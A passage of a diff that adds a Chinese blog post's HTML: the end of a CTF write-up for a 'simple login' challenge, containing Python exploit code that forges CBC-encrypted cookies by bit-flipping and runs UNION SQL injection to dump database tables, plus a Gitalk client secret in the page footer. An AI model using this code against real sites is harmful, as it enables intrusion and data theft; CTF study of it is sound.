+    <span class="n">iv</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"iv=(.*?),"</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Set-Cookie'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">cipher</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"cipher=(.*)"</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Set-Cookie'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">cipher</span><span class="o">=</span><span class="n">unquote</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+    <span class="n">cipher</span><span class="o">=</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+    <span class="n">cipher_list</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+    <span class="n">cipher_list</span><span class="p">[</span><span class="n">cbc_flip_index</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">cipher_list</span><span class="p">[</span><span class="n">cbc_flip_index</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_in_payload</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_to_replace</span><span class="p">))</span>
+    <span class="n">cipher_new</span><span class="o">=</span><span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cipher_list</span><span class="p">)</span>
+    <span class="n">cipher_new</span><span class="o">=</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cipher_new</span><span class="p">)</span>
+    <span class="n">cipher_new</span><span class="o">=</span><span class="n">quote</span><span class="p">(</span><span class="n">cipher_new</span><span class="p">)</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">'iv'</span><span class="p">:</span><span class="n">iv</span><span class="p">,</span><span class="s">'cipher'</span><span class="p">:</span><span class="n">cipher_new</span><span class="p">}</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">plain_base64</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"base64_decode</span><span class="err">\</span><span class="s">(</span><span class="se">\'</span><span class="s">(.*?)</span><span class="se">\'</span><span class="err">\</span><span class="s">)"</span><span class="p">,</span><span class="n">content</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">plain</span><span class="o">=</span><span class="n">b64decode</span><span class="p">(</span><span class="n">plain_base64</span><span class="p">)</span>
+    <span class="n">first_block_plain</span><span class="o">=</span><span class="s">"a:1:{s:2:</span><span class="se">\"</span><span class="s">id</span><span class="se">\"</span><span class="s">;s:"</span>
+    <span class="n">iv</span><span class="o">=</span><span class="n">unquote</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span>
+    <span class="n">iv</span><span class="o">=</span><span class="n">b64decode</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span>
+    <span class="n">iv_list</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+        <span class="n">iv_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">plain</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv_list</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">first_block_plain</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">iv_new</span><span class="o">=</span><span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">iv_list</span><span class="p">)</span>
+    <span class="n">iv_new</span><span class="o">=</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv_new</span><span class="p">)</span>
+    <span class="n">iv_new</span><span class="o">=</span><span class="n">quote</span><span class="p">(</span><span class="n">iv_new</span><span class="p">)</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">'iv'</span><span class="p">:</span><span class="n">iv_new</span><span class="p">,</span><span class="s">'cipher'</span><span class="p">:</span><span class="n">cipher_new</span><span class="p">}</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+<span class="c">#这个函数的目的是为了判断Union中select的次数，也就是说需要暴力破解处you_want表中的字段列数量</span>
+<span class="k">def</span> <span class="nf">get_columns_count</span><span class="p">():</span>
+    <span class="n">table_name</span><span class="o">=</span><span class="p">[</span><span class="s">'a'</span><span class="p">,</span> <span class="s">'b'</span><span class="p">,</span> <span class="s">'c'</span><span class="p">,</span> <span class="s">'d'</span><span class="p">,</span> <span class="s">'e'</span><span class="p">,</span> <span class="s">'f'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'h'</span><span class="p">,</span> <span class="s">'i'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'l'</span><span class="p">,</span> <span class="s">'m'</span><span class="p">,</span> <span class="s">'n'</span><span class="p">,</span> <span class="s">'o'</span><span class="p">,</span> <span class="s">'p'</span><span class="p">,</span> <span class="s">'q'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="s">'s'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'u'</span><span class="p">,</span> <span class="s">'v'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="s">'x'</span><span class="p">,</span> <span class="s">'y'</span><span class="p">,</span> <span class="s">'z'</span><span class="p">,</span> <span class="s">'A'</span><span class="p">,</span> <span class="s">'B'</span><span class="p">,</span> <span class="s">'C'</span><span class="p">,</span> <span class="s">'D'</span><span class="p">,</span> <span class="s">'E'</span><span class="p">,</span> <span class="s">'F'</span><span class="p">,</span> <span class="s">'G'</span><span class="p">,</span> <span class="s">'H'</span><span class="p">,</span> <span class="s">'I'</span><span class="p">,</span> <span class="s">'G'</span><span class="p">,</span> <span class="s">'K'</span><span class="p">,</span> <span class="s">'L'</span><span class="p">,</span> <span class="s">'M'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">,</span> <span class="s">'O'</span><span class="p">,</span> <span class="s">'P'</span><span class="p">,</span> <span class="s">'Q'</span><span class="p">,</span> <span class="s">'R'</span><span class="p">,</span> <span class="s">'S'</span><span class="p">,</span> <span class="s">'T'</span><span class="p">,</span> <span class="s">'U'</span><span class="p">,</span> <span class="s">'V'</span><span class="p">,</span> <span class="s">'W'</span><span class="p">,</span> <span class="s">'X'</span><span class="p">,</span> <span class="s">'Y'</span><span class="p">,</span> <span class="s">'Z'</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">table_name</span><span class="p">)):</span>
+        <span class="n">payload</span><span class="o">=</span><span class="s">"(select 1)a"</span>
+        <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s">"0 2nion select * from("</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s">");"</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+            <span class="n">content</span><span class="o">=</span><span class="n">find_flag</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+            <span class="n">resp</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">".*(Hello!)(</span><span class="err">\</span><span class="s">d).*"</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"table has 1 column and response position is 1"</span>
+                <span class="k">return</span> <span class="n">payload</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"table does not have </span><span class="si">%</span><span class="s">d columns"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">continue</span>
+        <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+            <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">+</span><span class="s">" join (select </span><span class="si">%</span><span class="s">d)</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">t</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="n">table_name</span><span class="p">[</span><span class="n">t</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"0 2nion select * from("</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s">");"</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">content</span><span class="o">=</span><span class="n">find_flag</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+        <span class="n">resp</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">".*(Hello!)(</span><span class="err">\</span><span class="s">d).*"</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">"table has </span><span class="si">%</span><span class="s">d column and response position is </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">resp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
+            <span class="k">return</span> <span class="n">payload</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">"table does not have </span><span class="si">%</span><span class="s">d columns"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">get_columns_count</span><span class="p">()</span>
+<span class="k">print</span> <span class="n">payload</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">'12'</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'#'</span><span class="p">)</span>
+<span class="c"># 下面加chr(0)是为了注释掉后面的内容, 且只要替换掉 2union 中的 2 就可以了</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">'0 2nion select * from((select 1)a);'</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">6</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">6</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">7</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">7</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">find_flag</span><span class="p">(</span><span class="s">"0 2nion select * from((select 1)a join (select value from you_want)b join (select 3)c);"</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">6</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'u'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="0x05-参考">0x05 参考</h2>
+
+<p><a href="http://www.shiyanbar.com/ctf/writeup/5163">简单的登录题 by pcat</a><br />
+<a href="https://blog.csdn.net/LeeHDsniper/article/details/81089480">实验吧-简单的登录题——WriteUp再研究</a></p>
+
+    </article>
+  
+    <div class="newold">
+  <hr>
+  
+  <b>上一篇: <a href="/2018/11/20/bk_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Bugku writeup(代码审计)</a></b><br>
+     
+   
+</div><!--上一篇 下一篇-->
+
+    <div class="share">
+      <div class="share-component"></div>
+    </div>
+    <div class="comment">
+      
+
+  
+
+  
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+        <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+        <script>
+        var gitalk = new Gitalk({
+            id: '/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/',
+            clientID: '5a59fdc570f933e0c2ee',
+            clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
+            repo: 'blogcomments',
+            owner: 'Catcheryp',
+            admin: ['Catcheryp'],
+            labels: ['gitment'],
+            perPage: 50,
+        })
+        gitalk.render('gitalk-container')
+        </script>
+  
+
+
+    </div>
+  </div>
+  <div class="column one-fourth">
+    
+<h3>Search</h3>
+<div id="site_search">
+    <input type="text" id="search_box" placeholder="Search">
+</div>
+
+<ul id="search_results"></ul>
+
+<link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/modules/sidebar-search.css">
+<script src="http://localhost:4000/assets/js/simple-jekyll-search.min.js"></script>
+<script src="http://localhost:4000/assets/js/search.js"></script>
+
+<script type="text/javascript">
+SimpleJekyllSearch({
+    searchInput: document.getElementById('search_box'),
+    resultsContainer: document.getElementById('search_results'),
+    json: 'http://localhost:4000/assets/search_data.json',
+    searchResultTemplate: '<li><a href="{url}" title="{desc}">{title}</a></li>',
+    noResultsText: 'No results found',
+    limit: 10,
+    fuzzy: false,
+    exclude: ['Welcome']
+})
+</script>
+
+    
+
+    
+<h3 class="post-directory-title mobile-hidden">Table of Contents</h3>
+<div id="post-directory-module" class="mobile-hidden">
+  <section class="post-directory">
+  <!-- Links that trigger the jumping -->
+  <!-- Added by javascript below -->
+  <dl></dl>
+  </section>
+</div>
+
+<script src="http://localhost:4000/assets/js/jquery.toc.js"></script>
+
+  </div>
+</div>
+</section>
+<!-- /section.content -->
+
+    <footer class="container">
+        <div class="site-footer" role="contentinfo">
+            <div class="copyright left mobile-block">
+                    © 2018
+                    <span title="Catcher">Catcher</span>
+                    <a href="javascript:window.scrollTo(0,0)" class="right mobile-visible">TOP</a>
+            </div>
+
+            <ul class="site-footer-links right mobile-hidden">
+                <li>
+                    <a href="javascript:window.scrollTo(0,0)" >TOP</a>
+                </li>
+            </ul>
+            <!--<a href="" target="_blank" aria-label="view source code">
+                <span class="mega-octicon octicon-mark-github" title="GitHub"></span>
+            </a>-->
+            <ul class="site-footer-links mobile-hidden">
+                
+                <li>
+                    <a href="http://localhost:4000/" title="主页" target="">主页</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/archives/" title="归档" target="">归档</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/tags/" title="标签" target="">标签</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/links/" title="链接" target="">链接</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/about/" title="关于" target="">关于</a>
+                </li>
+                
+                <li><a href="http://localhost:4000/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></li>
+            </ul>
+            <div id="zyzy"></div>
+
+        </div>
+    </footer>
+    <div class="tools-wrapper">
+      <a class="gotop" href="#" title="回到顶部"><span class="octicon octicon-arrow-up"></span></a>
+    </div>
+    <!-- / footer -->
+    <script src="http://localhost:4000/assets/vendor/share.js/dist/js/share.min.js"></script>
+    <script src="http://localhost:4000/assets/js/geopattern.js"></script>
+    <script src="http://localhost:4000/assets/js/prism.js"></script>
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/prism.css">
+    <script>
+      jQuery(document).ready(function($) {
+        // geopattern
+        $('.geopattern').each(function(){
+          $(this).geopattern($(this).data('pattern-id'));
+        });
+       // hljs.initHighlightingOnLoad();
+      });
+    </script>
+
+    
+
+    
+
+    
+
+    
+
+    
+    <div style="display:none">
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-80669434-1', 'auto');
+        ga('send', 'pageview');
+
+      </script>
+    </div>
+    
+    
+</body>
+<!--自言自语-->
+<script>
+    var xhr = new XMLHttpRequest();
+    var zyzy;
+    var arrayZyzy;
+    function getZyzy(){
+        var index1 = Math.floor(Math.random()*arrayZyzy.length);
+        var resText = "";
+        resText += "自言自语:\xa0「"+ arrayZyzy[index1] + "」";
+        zyzy.innerHTML = resText;
+    }
+    
+    xhr.onreadystatechange = function(){
+      // 通信成功时，状态值为4
+      if (xhr.readyState === 4){
+        if (xhr.status === 200){
+          console.log(xhr.responseText);
+          zyzy = document.getElementById("zyzy");
+          arrayZyzy = xhr.responseText.split("\n\n");
+
+          getZyzy();
+          setInterval("getZyzy()", 5000);
+
+        } else {
+          console.error(xhr.statusText);
+        }
+      }
+    };
+
+    xhr.onerror = function (e) {
+      console.error(xhr.statusText);
+    };
+
+    xhr.open('GET', '/zyzy.txt', true);
+    xhr.send(null);
+</script>
+</html>
